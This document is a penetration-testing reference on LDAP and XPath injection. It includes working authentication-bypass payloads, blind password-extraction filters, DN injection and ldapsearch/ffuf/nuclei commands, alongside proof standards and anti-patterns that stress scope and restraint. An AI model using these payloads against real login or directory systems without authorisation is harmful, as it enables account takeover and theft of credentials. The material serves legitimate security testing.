# LDAP Injection

> Directory services sit behind login and search forms in most enterprises. LDAP
> injection is rarer than SQLi and far more complete when it hits: the filter
> syntax is expressive enough to enumerate the entire directory.

## Where it appears

| Surface | Typical parameter |
|---|---|
| Login / SSO against AD or OpenLDAP | `user`, `uid`, `mail` |
| Employee / user search | `q`, `cn`, `name` |
| Org-chart and directory browsers | `dn`, `group` |
| Password reset "find my account" | `email`, `identifier` |
| ACL / group membership checks | `memberOf`, `grp` |

Framework tells: `javax.naming.directory`, `python-ldap`, `ldapjs`,
`System.DirectoryServices`, `php-ldap`.

## Filter syntax — what you are injecting into

An LDAP filter is a prefix expression in parentheses:

```
(&(objectClass=user)(uid=<INPUT>))
```

The escape sequence for values is `\` + two hex digits (`\2a` for `*`). A
correctly written app escapes user input; a vulnerable one concatenates.

## Detection — non-destructive

| Probe | Vulnerable response |
|---|---|
| `*` | returns every object — login as the first user, or a search returns all |
| `*)(uid=*` | broadens the filter |
| `admin*` | prefix match reveals real accounts |
| `\` (single backslash) | filter parse error, sometimes with the filter echoed |
| `)((` | error shape changes vs a literal |

A wildcard returning dramatically more rows than a literal is the cleanest
signal, and it is safe: it only reads.

## Authentication bypass

Against `(&(uid=<user>)(userPassword=<pass>))`:

| Payload | Effect |
|---|---|
| user `*`, pass `*` | matches the first entry that has both attributes |
| user `admin)(&)`, pass `x` | closes the uid clause, injects an always-true |
| user `*)(uid=*))(|(uid=*`, pass `x` | classic filter injection |
| user `admin)(!(&(1=0`, pass `x` | negated clause trick |

Against a filter using `(|(uid=..)(mail=..))` the closing/opening changes; send
a `)(` first and read the error to learn which shape you are in.

## Blind extraction

When responses are uniform, extract boolean-style:

```
(&(uid=admin)(userPassword=a*))      -> success means password starts with "a"
```

Password hash extraction follows the same shape against `userPassword` when the
directory allows anonymous bind and the attribute is readable — common on
misconfigured OpenLDAP.

For attributes:

```
(&(objectClass=person)(uid=*)(description=*<candidate>*))
```

Time-based LDAP injection is unreliable; prefer response-size and error
differentials.

## Blind, via DN injection

Some apps build a DN rather than a filter:

```
uid=<INPUT>,ou=people,dc=corp,dc=local
```

Injection there allows `uid=admin,ou=people,dc=corp,dc=local` to authenticate as
another DN if the bind is performed with the constructed DN.

## XPath — the sibling

XPath injection behaves identically with different syntax:

| Probe | Vulnerable response |
|---|---|
| `' or '1'='1` | returns all nodes |
| `x' or 1=1 or 'x'='x` | broader |
| `'] | //user['` | union-like node selection |

Blind XPath extraction: `' or string-length(//user[1]/password)>10 or 'x'='x`.
Faster than LDAP blind because string functions are rich.

## Tooling

```bash
# detection
nuclei -t ldap/ -u https://target
# wordlists
ffuf -w /opt/wordlists/params/ldap.txt -u "https://target/search?FUZZ=*"
# brute-force a bind when you have a host but one credential
ldapsearch -x -H ldap://target -D "cn=admin,dc=corp,dc=local" -w '<pass>' -b "dc=corp,dc=local"
```

Anonymous bind check first — many directories answer it:

```bash
ldapsearch -x -H ldap://target -b "" -s base namingContexts
```

A successful anonymous root DSE is itself a finding on internal hosts, and it
tells you the naming contexts to search.

## Proof standard

| Claim | Minimum evidence |
|---|---|
| auth bypass | log in as a different user without their password; show the resulting session and what it can read |
| directory enumeration | count of returned objects vs 1 for a literal input, plus a sample record |
| attribute disclosure | one non-sensitive attribute (mail, cn) read from a real entry |
| DN injection | authenticated bind as a DN you were not given credentials for |

Never dump password hashes in bulk. Show one record's field names, and say the
values were not exfiltrated.

## Anti-patterns

- Calling a `*` wildcard result an injection when the app intentionally does
  prefix search
- Reporting LDAP injection from an error message alone
- Testing anonymous bind against an internal directory without scope confirmation
- Bulk exfiltrating directory data to "prove" reach
